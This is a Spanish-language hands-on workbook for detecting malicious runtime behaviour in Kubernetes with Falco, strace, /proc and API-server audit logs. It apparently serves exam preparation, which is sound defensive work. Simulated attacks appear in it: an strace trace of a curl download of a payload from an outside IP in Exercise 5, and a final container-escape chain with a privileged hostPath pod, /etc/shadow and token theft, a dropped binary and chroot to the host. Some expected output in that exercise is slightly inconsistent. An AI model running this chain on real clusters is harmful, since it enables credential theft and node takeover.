# Ejercicios guiados — 6.1 Realizar analítica de comportamiento para detectar actividades maliciosas

> **Dominio:** Monitoring, Logging and Runtime Security · **Peso del examen de esta tarea:** 4
> **Entorno objetivo:** un clúster `kubeadm` (v1.34) con al menos un worker (`node01`) donde tenés `root` en el host. Se asume kernel ≥ 5.8 para que el driver *modern eBPF* esté disponible.
> **Qué significa acá "analítica de comportamiento":** no estás escaneando artefactos en reposo (eso es Supply Chain Security). Estás observando qué *hace* un proceso en tiempo de ejecución — las syscalls que emite, los archivos que abre, los sockets que conecta, los binarios que lanza — y decidiendo si ese comportamiento se desvía del perfil esperado del workload.

---

## Ejercicio 1 — Instalar un sensor de runtime y confirmar qué driver está recolectando eventos realmente

La falla de laboratorio más común es un Falco que arranca, imprime reglas y nunca emite un evento porque su driver nunca se enganchó. Verificá el camino de los datos *antes* de confiar en cualquier detección.

1. En `node01`, agregá el repositorio de Falco e instalá el paquete:

```bash
curl -fsSL https://falco.org/repo/falcosecurity-packages.asc \
  | sudo gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg

echo "deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] \
https://download.falco.org/packages/deb stable main" \
  | sudo tee /etc/apt/sources.list.d/falcosecurity.list

sudo apt-get update
sudo apt-get install -y falco
```

> En un entorno offline estilo examen el paquete suele estar pre-preparado; `apt-get install -y falco` o un DaemonSet `falco` ya existente es todo lo que tenés. No quemes tiempo en repositorios.

2. Inspeccioná las versiones de cada pieza móvil:

```bash
falco --version
```

```
Falco version: 0.40.0 (x86_64)
Libs version:  0.20.0
Plugin API:    3.8.0
Engine:        0.44.0
Driver:
  API version:    8.0.0
  Schema version: 2.0.0
  Default driver: 7.3.0+driver
```

3. Mirá qué driver está configurado para abrir la unidad:

```bash
grep -A5 '^engine:' /etc/falco/falco.yaml
```

```yaml
engine:
  kind: modern_ebpf
  kmod:
    buf_size_preset: 4
    drop_failed_exit: false
  ebpf:
    probe: ${HOME}/.falco/falco-bpf.o
```

4. Listá las unidades systemd instaladas y arrancá exactamente una de ellas:

```bash
systemctl list-unit-files 'falco*'
sudo systemctl enable --now falco-modern-bpf.service
sudo systemctl status falco-modern-bpf.service --no-pager
```

5. Confirmá desde los logs que la fuente se abrió realmente:

```bash
sudo journalctl -u falco-modern-bpf.service -n 30 --no-pager
```

```
falco[3412]: Falco version: 0.40.0 (x86_64)
falco[3412]: Falco initialized with configuration files:
falco[3412]:    /etc/falco/falco.yaml | schema validation: ok
falco[3412]: Loading rules from:
falco[3412]:    /etc/falco/falco_rules.yaml | schema validation: ok
falco[3412]:    /etc/falco/falco_rules.local.yaml | schema validation: ok
falco[3412]: Starting health webserver with threadiness 4, listening on 0.0.0.0:8765
falco[3412]: Loaded event sources: syscall
falco[3412]: Enabled event sources: syscall
falco[3412]: Opening 'syscall' source with modern BPF probe.
falco[3412]: One ring buffer every '2' CPUs.
```

6. Probá de punta a punta que los eventos fluyen, usando una ejecución en primer plano acotada en el tiempo:

```bash
sudo systemctl stop falco-modern-bpf.service
sudo falco -M 20 -U -o engine.kind=modern_ebpf
# in another shell on node01:
sudo cat /etc/shadow > /dev/null
```

```
15:22:41.882135000: Warning Sensitive file opened for reading by non-trusted program (file=/etc/shadow gparent=sshd ggparent=systemd evt_type=openat user=root user_uid=0 user_loginuid=1000 process=cat proc_exepath=/usr/bin/cat parent=bash command=cat /etc/shadow terminal=34816 container_id=host container_name=host)
Events detected: 1
Rule counts by severity:
   WARNING: 1
Triggered rules by rule name:
   Sensitive file opened for reading by non-trusted program: 1
```

**Preguntas**

- **Q1.** `falco --version` reporta una versión de *driver* y una versión de *engine*. ¿Qué se rompe si la versión del driver es incompatible con el kernel, y qué se rompe si la versión del engine es menor que el `required_engine_version` de un archivo de reglas?
- **Q2.** ¿Por qué `modern_ebpf` es preferible a `kmod` en una flota que no controlás, y cuál es el único requisito duro que impone?
- **Q3.** En el paso 6 el evento lleva `container_id=host`. ¿Qué te dice eso sobre dónde corrió `cat`, y qué campo habrías inspeccionado si hubiera corrido dentro de un Pod?
- **Q4.** Arrancaste `falco-modern-bpf.service` *y* dejaste `falco-kmod.service` habilitado. ¿Qué síntoma esperarías, y por qué?

---

## Ejercicio 2 — Leer el motor de reglas: listas, macros, reglas y gating por madurez

Una detección de comportamiento vale lo que vale la condición que hay detrás. Aprendé a navegar el ruleset que viene incluido antes de escribir el tuyo.

1. Identificá cada archivo de reglas que carga el daemon, en orden:

```bash
grep -A10 -E '^rules_files?:' /etc/falco/falco.yaml
```

```yaml
rules_files:
  - /etc/falco/falco_rules.yaml
  - /etc/falco/falco_rules.local.yaml
  - /etc/falco/rules.d
```

> La clave es `rules_files` en Falco ≥ 0.38; las builds más viejas la llaman `rules_file`. Ambas aceptan una lista, y **el orden importa**: una macro o lista debe estar definida antes de la regla que la referencia.

2. Enumerá las reglas cargadas y leé una condición completa:

```bash
sudo falco -L | head -20
sudo falco -l "Terminal shell in container"
```

```
----------------------
Rule Terminal shell in container
Description:
 A shell was used as the entrypoint/exec point into a container with an attached terminal.
Condition:
 spawned_process and container and shell_procs and proc.tty != 0 and container_entrypoint and not user_expected_terminal_shell_in_container_conditions
Priority: NOTICE
Tags: [T1059 container maturity_stable mitre_execution shell]
Source: syscall
```

3. Resolvé las macros de las que depende esa condición:

```bash
grep -A4 -E '^- macro: (spawned_process|container|container_entrypoint)$' /etc/falco/falco_rules.yaml
grep -A3 -E '^- list: shell_binaries$' /etc/falco/falco_rules.yaml
```

```yaml
- macro: spawned_process
  condition: (evt.type in (execve, execveat) and evt.dir=<)

- macro: container
  condition: (container.id != host)

- macro: container_entrypoint
  condition: (not proc.pname exists or proc.pname in (runc:[0:PARENT], runc:[1:CHILD], runc, docker-runc, exe, docker-runc-cur, containerd-shim, systemd, crio, crio-conmon))

- list: shell_binaries
  items: [ash, bash, csh, ksh, sh, tcsh, zsh, dash]
```

4. Verificá qué niveles de madurez están activos realmente. Desde Falco 0.38 el ruleset está dividido, y solo `stable` viene habilitado:

```bash
sudo falco -L | grep -c .
sudo grep -c 'maturity_incubating' /etc/falco/falco_rules.yaml
ls -1 /etc/falco/ | grep rules
sudo falcoctl artifact list
```

```
NAME                    TYPE            REGISTRY        REPOSITORY
falco-rules             rulesfile       ghcr.io         falcosecurity/rules/falco-rules
falco-incubating-rules  rulesfile       ghcr.io         falcosecurity/rules/falco-incubating-rules
falco-sandbox-rules     rulesfile       ghcr.io         falcosecurity/rules/falco-sandbox-rules
```

5. Habilitá el nivel incubating y confirmá que la cuenta de reglas crece:

```bash
sudo falcoctl artifact install falco-incubating-rules:3
sudo sed -i '/falco_rules.local.yaml/i\  - /etc/falco/falco-incubating_rules.yaml' /etc/falco/falco.yaml
sudo falco -L | grep -E '^Rule ' | wc -l
```

6. Validá la sintaxis de cada archivo de reglas *sin* arrancar el daemon — este es el chequeo a correr antes de cualquier recarga:

```bash
sudo falco --validate /etc/falco/falco_rules.local.yaml
```

```
Validating rules file(s):
   /etc/falco/falco_rules.local.yaml | schema validation: ok
Ok
```

**Preguntas**

- **Q5.** ¿Cuál es la diferencia práctica entre una `list`, una `macro` y una `rule`? ¿Cuál de las tres puede aparecer en una cadena de `output`?
- **Q6.** `Terminal shell in container` requiere `proc.tty != 0` **y** `container_entrypoint`. Describí una acción de atacante que lance una shell en un contenedor y sin embargo *no* dispare esta regla, y explicá qué cláusula la deja pasar.
- **Q7.** Escribiste una regla que referencia `open_read` en `falco_rules.local.yaml`, pero además reordenaste `rules_files` para que el archivo local cargue primero. ¿Qué pasa al arrancar, y cuál es la clase exacta de error?
- **Q8.** ¿Por qué Falco distribuye las reglas `incubating` y `sandbox` deshabilitadas por defecto? Dá el argumento operativo, no solo "son nuevas".

---

## Ejercicio 3 — Escribir una regla de comportamiento propia y recargarla de forma segura

Las reglas por defecto describen comportamiento malo *genérico*. La analítica de comportamiento para tu clúster significa codificar qué se supone que hacen *tus* workloads.

1. Desplegá un workload objetivo:

```bash
kubectl create ns shop
kubectl -n shop create deployment api --image=nginx:1.27 --replicas=1
kubectl -n shop get pods -o wide
```

2. Escribí una regla que marque cualquier proceso que lea el token proyectado de ServiceAccount cuando no sea el binario esperado del workload. Creá `/etc/falco/rules.d/10-shop.yaml`:

```yaml
- required_engine_version: 0.44.0

- list: shop_expected_token_readers
  items: [nginx, kubectl, curl-sidecar]

- macro: sa_token_file
  condition: (fd.name contains "/secrets/kubernetes.io/serviceaccount/token")

- macro: shop_workload
  condition: (k8s.ns.name = "shop")

- rule: Unexpected ServiceAccount Token Read In Shop
  desc: >
    A process that is not part of the declared workload profile opened the
    projected ServiceAccount token. This is the canonical first step of
    in-cluster lateral movement: read the token, then talk to the API server
    with the Pod's identity.
  condition: >
    open_read
    and container
    and shop_workload
    and sa_token_file
    and not proc.name in (shop_expected_token_readers)
  output: >
    ServiceAccount token read by unexpected process
    (file=%fd.name proc=%proc.name pproc=%proc.pname aproc2=%proc.aname[2]
     cmd=%proc.cmdline exe=%proc.exepath user=%user.name uid=%user.uid
     container=%container.name image=%container.image.repository
     ns=%k8s.ns.name pod=%k8s.pod.name)
  priority: CRITICAL
  tags: [container, k8s, mitre_credential_access, T1552.001]
```

3. Validá y después recargá sin reiniciar el proceso:

```bash
sudo falco --validate /etc/falco/rules.d/10-shop.yaml
sudo kill -HUP "$(pidof falco)"
sudo journalctl -u falco-modern-bpf.service -n 5 --no-pager
```

```
falco[3412]: SIGHUP received, restarting...
falco[3412]: Loading rules from:
falco[3412]:    /etc/falco/falco_rules.yaml | schema validation: ok
falco[3412]:    /etc/falco/rules.d/10-shop.yaml | schema validation: ok
```

4. Disparala desde dentro del Pod:

```bash
kubectl -n shop exec -it deploy/api -- \
  sh -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 20'
```

```
15:48:07.221904000: Critical ServiceAccount token read by unexpected process (file=/var/run/secrets/kubernetes.io/serviceaccount/token proc=cat pproc=sh aproc2=containerd-shim cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token exe=/usr/bin/cat user=root uid=0 container=api image=docker.io/library/nginx ns=shop pod=api-6c9d7f8b4d-x2n7q)
```

5. Ahora suprimí una excepción legítima **sin editar el archivo distribuido**, usando el mecanismo `override` (Falco ≥ 0.37 — reemplazó al viejo `append: true`). Agregá al final de `10-shop.yaml`:

```yaml
- rule: Unexpected ServiceAccount Token Read In Shop
  condition: and not (proc.name = "cat" and proc.pname = "entrypoint.sh")
  override:
    condition: append
```

6. Recargá y volvé a probar para confirmar que la excepción se respeta mientras todo lo demás sigue disparando.

**Preguntas**

- **Q9.** La alerta reporta `file=/var/run/secrets/...` pero en el host ese token vive bajo `/var/lib/kubelet/pods/<uid>/volumes/...`. ¿Por qué Falco imprime la ruta relativa al contenedor, y qué implica eso para las reglas que matchean rutas absolutas?
- **Q10.** ¿Por qué `override: {condition: append}` es estrictamente mejor que copiar la regla distribuida a tu archivo local y editarla? Nombrá dos modos de falla concretos del enfoque copiar-y-pegar.
- **Q11.** La regla usa `%proc.aname[2]`. ¿Qué es ese campo, y por qué el nombre de un ancestro suele ser una señal de comportamiento más fuerte que `proc.name` solo?
- **Q12.** Tu regla se apoya en `k8s.ns.name = "shop"`. ¿Qué tiene que ser cierto sobre el enriquecimiento de metadatos de Falco para que ese campo esté poblado, y cómo se vería la alerta si el enriquecimiento no estuviera disponible?

---

## Ejercicio 4 — Detectar el *comportamiento*, no el *nombre*: ejecución de un binario recién escrito

Las reglas basadas en nombres (`proc.name = xmrig`) se evaden trivialmente renombrando. La señal duradera es estructural: un binario que fue escrito en la capa escribible del contenedor y después ejecutado, o ejecutado directamente desde memoria anónima.

1. Inspeccioná los dos campos estructurales que hacen esto posible:

```bash
sudo falco --list syscall | grep -E 'is_exe_upper_layer|is_exe_from_memfd|exe_writable'
```

```
proc.is_exe_upper_layer      'true' if the executable file is in the upper layer of an overlayfs container filesystem
proc.is_exe_from_memfd       'true' if the executable was executed from a memfd file descriptor
proc.exe_writable            'true' if the executable file is writable by the same user that spawned it
```

2. Agregá una regla a `/etc/falco/rules.d/10-shop.yaml`:

```yaml
- rule: Execution Of Binary Written Into Container Layer
  desc: >
    A process executed a binary that lives in the container's writable
    (upper) overlayfs layer. Immutable images never do this: the binary was
    dropped after the container started.
  condition: >
    spawned_process
    and container
    and proc.is_exe_upper_layer = true
    and not proc.name in (dpkg, apt, apt-get, rpm, yum, microdnf)
  output: >
    Dropped binary executed in container
    (proc=%proc.name exe=%proc.exepath cmd=%proc.cmdline upper_layer=%proc.is_exe_upper_layer
     parent=%proc.pname user=%user.name container=%container.name
     image=%container.image.repository ns=%k8s.ns.name pod=%k8s.pod.name)
  priority: CRITICAL
  tags: [container, mitre_execution, T1204]

- rule: Fileless Execution Via memfd In Container
  desc: A binary was executed directly from an anonymous in-memory file descriptor.
  condition: spawned_process and container and proc.is_exe_from_memfd = true
  output: >
    Fileless execution detected
    (proc=%proc.name exe=%proc.exepath cmd=%proc.cmdline parent=%proc.pname
     container=%container.name ns=%k8s.ns.name pod=%k8s.pod.name)
  priority: CRITICAL
  tags: [container, mitre_defense_evasion, T1620]
```

3. Recargá y simulá el drop-and-execute:

```bash
sudo kill -HUP "$(pidof falco)"

kubectl -n shop exec -it deploy/api -- sh -c '
  cp /bin/sleep /tmp/systemd-worker &&
  chmod +x /tmp/systemd-worker &&
  /tmp/systemd-worker 5'
```

```
16:04:12.554901000: Critical Dropped binary executed in container (proc=systemd-worker exe=/tmp/systemd-worker cmd=systemd-worker 5 upper_layer=true parent=sh user=root container=api image=docker.io/library/nginx ns=shop pod=api-6c9d7f8b4d-x2n7q)
```

4. Notá que el atacante renombró el binario a algo que parece un daemon del sistema, y la regla disparó igual.

**Preguntas**

- **Q13.** Explicá, en términos del sistema de archivos del contenedor, por qué `proc.is_exe_upper_layer=true` es una señal con casi cero falsos positivos para una imagen construida con un conjunto fijo de binarios — y nombrá la única clase legítima de workload que la viola.
- **Q14.** ¿Cómo derrota un loader basado en `memfd_create` tanto al monitoreo de integridad de archivos como a la regla de upper layer, y qué campo lo atrapa?
- **Q15.** Un atacante copia `/bin/busybox` (ya presente en la imagen, capa inferior) a una ruta nueva y lo ejecuta. ¿Dispara `Execution Of Binary Written Into Container Layer`? Explicá.
- **Q16.** ¿Cómo cambiaría lo que ve esta regla el hecho de forzar un sistema de archivos raíz de solo lectura (`securityContext.readOnlyRootFilesystem: true`), y por qué la detección sigue valiendo la pena?

---

## Ejercicio 5 — Verdad de campo a nivel de syscall: `strace`, `/proc` y contenedores efímeros

Cuando dispara una regla tenés que poder responder *qué hizo exactamente ese proceso*. Falco te dice que matcheó un patrón; `strace` y `/proc` te dicen el comportamiento crudo.

1. Arrancá un proceso sospechoso de larga duración y encontrá su PID en el host:

```bash
kubectl -n shop exec -d deploy/api -- sh -c 'while true; do sleep 30; done'

# on node01
POD=$(kubectl -n shop get pod -l app=api -o jsonpath='{.items[0].metadata.name}')
CID=$(sudo crictl ps --name api -q)
PID=$(sudo crictl inspect --output go-template --template '{{.info.pid}}' "$CID")
echo "container $CID -> host pid $PID"
```

2. Leé la identidad del proceso directamente de `/proc`, sobre la cual ningún `ps` provisto por el atacante puede mentir:

```bash
sudo ls -l /proc/$PID/exe
sudo tr '\0' ' ' < /proc/$PID/cmdline; echo
sudo cat /proc/$PID/status | grep -E 'Name|Uid|Gid|CapEff|Seccomp|NoNewPrivs'
sudo ls -l /proc/$PID/ns/
```

```
lrwxrwxrwx 1 root root 0 Aug  5 16:11 /proc/24188/exe -> /usr/sbin/nginx
nginx: master process nginx -g daemon off;
Name:   nginx
Uid:    0       0       0       0
CapEff: 00000000a80425fb
Seccomp:        2
NoNewPrivs:     1
lrwxrwxrwx 1 root root 0 Aug  5 16:11 mnt -> 'mnt:[4026532501]'
lrwxrwxrwx 1 root root 0 Aug  5 16:11 net -> 'net:[4026532404]'
lrwxrwxrwx 1 root root 0 Aug  5 16:11 pid -> 'pid:[4026532502]'
```

3. Enganchá `strace` desde el host, filtrando a las familias de syscalls que llevan significado de comportamiento:

```bash
sudo strace -f -p "$PID" -tt -s 256 \
  -e trace=execve,execveat,openat,connect,socket,ptrace,setuid,chmod
```

```
16:13:02.663512 [pid 24240] execve("/bin/sh", ["sh", "-c", "curl -sO http://198.51.100.20/payload"], 0x55f...) = 0
16:13:02.701442 [pid 24240] socket(AF_INET, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP) = 5
16:13:02.701899 [pid 24240] connect(5, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("198.51.100.20")}, 16) = -1 EINPROGRESS (Operation now in progress)
16:13:03.114522 [pid 24240] openat(AT_FDCWD, "payload", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 6
16:13:03.220118 [pid 24240] chmod("payload", 0755) = 0
```

4. Hacé lo mismo a la manera nativa de Kubernetes, sin acceso al host, usando un contenedor efímero de depuración:

```bash
kubectl -n shop debug -it "$POD" \
  --image=nicolaka/netshoot \
  --target=api \
  --profile=sysadmin \
  -- bash

# inside the ephemeral container:
ps -ef
strace -f -p 1 -e trace=openat,connect
```

5. Compará: corré el mismo workload bajo `strace -c` para obtener un *perfil* de syscalls — la entrada que usarías para construir una allow-list de seccomp:

```bash
sudo strace -f -c -p "$PID" -o /tmp/api-profile.txt
sleep 60; sudo pkill -INT strace
head -15 /tmp/api-profile.txt
```

```
% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
 41.02    0.004112          21       191           epoll_wait
 19.77    0.001982          11       171           accept4
 12.44    0.001247           7       168           recvfrom
  9.88    0.000990           5       181           writev
  6.31    0.000633           3       182           close
```

**Preguntas**

- **Q17.** `/proc/$PID/status` mostró `Seccomp: 2`. ¿Qué significa ese valor, y cuáles otras dos líneas de esa salida chequearías primero al triar una sospecha de escape de contenedor?
- **Q18.** ¿Por qué `strace` requiere `CAP_SYS_PTRACE` y, en el caso del contenedor efímero, un namespace de PID compartido? ¿Qué configura realmente `--profile=sysadmin`?
- **Q19.** `strace` sobre un proceso de producción con carga es peligroso. Enunciá el mecanismo que lo hace costoso y nombrá la alternativa basada en eBPF que lo evita.
- **Q20.** El perfil de `strace -c` es una línea base de comportamiento. Dá una razón por la cual es *inseguro* convertirlo directamente en una allow-list de seccomp sin trabajo adicional.

---

## Ejercicio 6 — Los audit logs de Kubernetes como feed de comportamiento del plano de control

La telemetría de syscalls ve el nodo. Los audit logs ven el API server: quién pidió qué, con qué identidad, y si se permitió. Las detecciones reales correlacionan ambos.

1. Escribí una política de auditoría en `/etc/kubernetes/audit/policy.yaml` en el plano de control:

```yaml
apiVersion: audit.k8s.io/v1
kind: Policy
omitStages:
  - RequestReceived
rules:
  # Interactive access to workloads — always a behavioral signal.
  - level: RequestResponse
    resources:
      - group: ""
        resources: ["pods/exec", "pods/attach", "pods/portforward", "pods/ephemeralcontainers"]

  # Secret access: metadata only, never the payload.
  - level: Metadata
    resources:
      - group: ""
        resources: ["secrets", "configmaps"]

  # Privilege manipulation.
  - level: RequestResponse
    resources:
      - group: "rbac.authorization.k8s.io"
        resources: ["clusterrolebindings", "rolebindings", "clusterroles", "roles"]

  # Drop the noise floor.
  - level: None
    users: ["system:kube-scheduler", "system:kube-controller-manager"]
  - level: None
    nonResourceURLs: ["/healthz*", "/readyz*", "/livez*", "/version", "/metrics"]

  - level: Metadata
```

2. Conectala al Pod estático del API server, `/etc/kubernetes/manifests/kube-apiserver.yaml`:

```yaml
spec:
  containers:
  - command:
    - kube-apiserver
    - --audit-policy-file=/etc/kubernetes/audit/policy.yaml
    - --audit-log-path=/var/log/kubernetes/audit/audit.log
    - --audit-log-maxage=30
    - --audit-log-maxbackup=10
    - --audit-log-maxsize=100
    volumeMounts:
    - name: audit-policy
      mountPath: /etc/kubernetes/audit
      readOnly: true
    - name: audit-logs
      mountPath: /var/log/kubernetes/audit
      readOnly: false
  volumes:
  - name: audit-policy
    hostPath:
      path: /etc/kubernetes/audit
      type: DirectoryOrCreate
  - name: audit-logs
    hostPath:
      path: /var/log/kubernetes/audit
      type: DirectoryOrCreate
```

3. Esperá a que el kubelet reinicie el Pod estático, después confirmá:

```bash
sudo crictl ps | grep kube-apiserver
kubectl -n shop exec deploy/api -- id
sudo tail -1 /var/log/kubernetes/audit/audit.log | jq '{stage,verb,uri:.requestURI,user:.user.username,groups:.user.groups,decision:.annotations["authorization.k8s.io/decision"],reason:.annotations["authorization.k8s.io/reason"]}'
```

```json
{
  "stage": "ResponseComplete",
  "verb": "create",
  "uri": "/api/v1/namespaces/shop/pods/api-6c9d7f8b4d-x2n7q/exec?command=id&container=api&stderr=true&stdout=true",
  "user": "kubernetes-admin",
  "groups": ["kubeadm:cluster-admins", "system:authenticated"],
  "decision": "allow",
  "reason": "RBAC: allowed by ClusterRoleBinding \"kubeadm:cluster-admins\" of ClusterRole \"cluster-admin\" to Group \"kubeadm:cluster-admins\""
}
```

4. Cazá anomalías con `jq` — un ServiceAccount leyendo Secrets que nunca leyó antes, o una ráfaga de respuestas `forbidden` (enumeración de permisos clásica):

```bash
# Which identities read Secrets?
sudo jq -r 'select(.objectRef.resource=="secrets" and .verb=="get")
  | [.user.username, .objectRef.namespace, .objectRef.name] | @tsv' \
  /var/log/kubernetes/audit/audit.log | sort | uniq -c | sort -rn | head

# Denied requests grouped by identity — enumeration looks like a long tail of 403s.
sudo jq -r 'select(.annotations["authorization.k8s.io/decision"]=="forbid")
  | [.user.username, .verb, .objectRef.resource] | @tsv' \
  /var/log/kubernetes/audit/audit.log | sort | uniq -c | sort -rn | head
```

```
     47 system:serviceaccount:shop:default	list	secrets
     31 system:serviceaccount:shop:default	list	nodes
     29 system:serviceaccount:shop:default	create	clusterrolebindings
```

5. Alimentá el mismo stream a Falco con el plugin `k8saudit` para que el comportamiento del plano de control sea evaluado por el mismo motor:

```bash
sudo falcoctl artifact install k8saudit-rules
sudo falcoctl artifact install k8saudit
```

```yaml
# /etc/falco/falco.yaml
plugins:
  - name: k8saudit
    library_path: libk8saudit.so
    init_config:
      maxEventSize: 262144
    open_params: "http://:9765/k8s-audit"
  - name: json
    library_path: libjson.so

load_plugins: [k8saudit, json]

rules_files:
  - /etc/falco/falco_rules.yaml
  - /etc/falco/k8s_audit_rules.yaml
  - /etc/falco/rules.d
```

Después apuntá el API server hacia él con un backend de webhook (`--audit-webhook-config-file`) cuyo `cluster.server` sea `http://<node01-ip>:9765/k8s-audit`.

**Preguntas**

- **Q21.** La política pone `level: Metadata` para `secrets` pero `RequestResponse` para `pods/exec`. Justificá ambas elecciones — ¿qué se filtraría exactamente si `secrets` fuera `RequestResponse`?
- **Q22.** Las reglas se evalúan de arriba hacia abajo y gana el **primer** match. ¿Qué se rompe si movés el `- level: Metadata` catch-all final al tope de la lista?
- **Q23.** `omitStages: [RequestReceived]` reduce el volumen de log aproximadamente a la mitad. ¿Qué etapa lleva la decisión de autorización, y qué etapa necesitarías si estuvieras investigando peticiones que nunca se completaron?
- **Q24.** En el paso 4, `system:serviceaccount:shop:default` intentó `create clusterrolebindings` 29 veces y fue rechazado todas. ¿Por qué una petición *denegada* suele ser más valiosa para un pipeline de detección que una permitida?
- **Q25.** Compará el backend de archivo de log con el backend de webhook para alimentar a Falco. ¿Cuál pierde eventos si el receptor está caído, y cuál puede generar back-pressure sobre el API server?

---

## Ejercicio 7 — Salida estructurada, enrutamiento y testeo offline de reglas

Una detección que nadie recibe no es una detección. Y una regla que no podés reproducir contra una captura fija es una regla que no podés testear por regresión.

1. Cambiá a salida estructurada para que los sistemas downstream puedan parsear campos, no prosa:

```yaml
# /etc/falco/falco.yaml
json_output: true
json_include_output_property: true
json_include_tags_property: true
buffered_outputs: false

stdout_output:
  enabled: true

http_output:
  enabled: true
  url: "http://falcosidekick.falco.svc.cluster.local:2801/"
  user_agent: "falcosecurity/falco"

priority: notice          # minimum severity actually evaluated
rule_matching: first      # stop at the first matching rule, or 'all'
```

2. Recargá y observá la forma del JSON:

```bash
sudo kill -HUP "$(pidof falco)"
kubectl -n shop exec -it deploy/api -- bash -c 'echo hi'
sudo journalctl -u falco-modern-bpf.service -n 1 --no-pager -o cat | jq .
```

```json
{
  "hostname": "node01",
  "output": "16:41:55.203 node01 (id=8f4b8e6a5c1d) A shell was spawned in a container...",
  "output_fields": {
    "container.id": "8f4b8e6a5c1d",
    "container.image.repository": "docker.io/library/nginx",
    "evt.time": 1754412115203441000,
    "k8s.ns.name": "shop",
    "k8s.pod.name": "api-6c9d7f8b4d-x2n7q",
    "proc.cmdline": "bash -c echo hi",
    "proc.pname": "containerd-shim",
    "user.name": "root"
  },
  "priority": "Notice",
  "rule": "Terminal shell in container",
  "source": "syscall",
  "tags": ["T1059", "container", "maturity_stable", "mitre_execution", "shell"],
  "time": "2026-08-05T16:41:55.203441000Z"
}
```

3. Capturá un stream de eventos reproducible y reproducilo contra una regla candidata — así se testea por regresión una detección sin volver a montar el ataque:

```bash
# record 30 s of syscall activity to a capture file
sudo sysdig -w /tmp/attack.scap -M 30
# ...reproduce the attack in another shell...

# replay it through any ruleset, offline, deterministically
sudo falco -e /tmp/attack.scap -r /etc/falco/rules.d/10-shop.yaml -r /etc/falco/falco_rules.yaml
```

```
Events detected: 3
Rule counts by severity:
   CRITICAL: 2
   NOTICE: 1
Triggered rules by rule name:
   Unexpected ServiceAccount Token Read In Shop: 1
   Dropped binary executed in container: 1
   Terminal shell in container: 1
```

4. Verificá que no estás perdiendo eventos silenciosamente bajo carga — los eventos descartados son puntos ciegos silenciosos:

```bash
sudo curl -s localhost:8765/healthz
sudo journalctl -u falco-modern-bpf.service | grep -i 'drop'
```

```
falco[3412]: Falco internal: syscall event drop. 128 system calls dropped in last second.
```

**Preguntas**

- **Q26.** `priority: notice` en `falco.yaml` y `priority: CRITICAL` en una regla son cosas distintas. Explicá ambas, y describí qué le pasa a una regla `INFORMATIONAL` bajo esta configuración.
- **Q27.** `rule_matching: first` versus `all`: dá un escenario de ingeniería de detección donde `first` te hace perder una alerta que querías.
- **Q28.** ¿Por qué `buffered_outputs: false` es la elección correcta para un despliegue de respuesta a incidentes a pesar del costo en throughput?
- **Q29.** ¿Qué significa mecánicamente "syscall event drop", nombrá dos formas de reducirlo, y explicá por qué tratarlo como una advertencia en lugar de un incidente es un error?
- **Q30.** Reproducir `/tmp/attack.scap` produjo resultados idénticos dos veces. ¿Por qué un test basado en captura nunca puede reemplazar del todo a un test en vivo de una regla que usa `k8s.ns.name`?

---

## Ejercicio 8 — De punta a punta: detectar una cadena de intrusión completa y correlacionar los dos feeds

Ahora ensamblá todo. Una alerta sola es ruido; una *secuencia* de alertas sobre el mismo `container.id` en segundos es un incidente.

1. Desplegá una víctima con permisos excesivos:

```yaml
# victim.yaml
apiVersion: v1
kind: ServiceAccount
metadata: {name: builder, namespace: shop}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata: {name: builder-admin, namespace: shop}
roleRef: {apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: admin}
subjects: [{kind: ServiceAccount, name: builder, namespace: shop}]
---
apiVersion: v1
kind: Pod
metadata: {name: victim, namespace: shop}
spec:
  serviceAccountName: builder
  containers:
  - name: app
    image: nginx:1.27
    securityContext:
      privileged: true
    volumeMounts:
    - {name: hostroot, mountPath: /host}
  volumes:
  - name: hostroot
    hostPath: {path: /, type: Directory}
```

```bash
kubectl apply -f victim.yaml
```

2. Observá ambos feeds simultáneamente:

```bash
# terminal A — runtime
sudo journalctl -u falco-modern-bpf.service -f -o cat | jq -r '[.time, .priority, .rule, .output_fields["k8s.pod.name"]] | @tsv'

# terminal B — control plane
sudo tail -f /var/log/kubernetes/audit/audit.log | jq -r 'select(.verb!="get") | [.stage, .user.username, .verb, .objectRef.resource] | @tsv'
```

3. Ejecutá la cadena:

```bash
kubectl -n shop exec -it victim -- bash          # (a) interactive access
# inside:
cat /etc/shadow | head -2                        # (b) sensitive file read
ls /host/etc/kubernetes/pki                      # (c) host filesystem traversal
cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/t   # (d) credential theft
cp /bin/sleep /tmp/kworker && chmod +x /tmp/kworker && /tmp/kworker 3   # (e) dropped binary
chroot /host sh -c 'id'                          # (f) escape to the node
```

4. Salida correlacionada esperada en la terminal A:

```
2026-08-05T17:02:11Z	Notice	    Terminal shell in container	                        victim
2026-08-05T17:02:19Z	Warning	    Sensitive file opened for reading by non-trusted program	victim
2026-08-05T17:02:26Z	Notice	    Read sensitive file untrusted	                    victim
2026-08-05T17:02:33Z	Critical	ServiceAccount token read by unexpected process	    victim
2026-08-05T17:02:41Z	Critical	Dropped binary executed in container	            victim
2026-08-05T17:02:48Z	Critical	Container Run as Root / chroot detected	            victim
```

5. Y en la terminal B, la mitad de la misma historia correspondiente al plano de control:

```
ResponseComplete	kubernetes-admin	create	pods/exec
```

6. Escribí la correlación como una pregunta *con estado*. Las reglas de Falco son sin estado por evento; expresá el join en tu SIEM:

```bash
sudo journalctl -u falco-modern-bpf.service --since "-10min" -o cat \
  | jq -c 'select(.priority=="Critical" or .priority=="Warning")
           | {t:.time, pod:.output_fields["k8s.pod.name"], rule:.rule}' \
  | jq -s 'group_by(.pod)
           | map({pod: .[0].pod, distinct_rules: (map(.rule) | unique | length), events: length})
           | map(select(.distinct_rules >= 3))'
```

```json
[
  {
    "pod": "victim",
    "distinct_rules": 4,
    "events": 6
  }
]
```

7. Limpiá:

```bash
kubectl delete -f victim.yaml
kubectl delete ns shop
sudo rm -f /etc/falco/rules.d/10-shop.yaml /tmp/attack.scap
sudo systemctl restart falco-modern-bpf.service
```

**Preguntas**

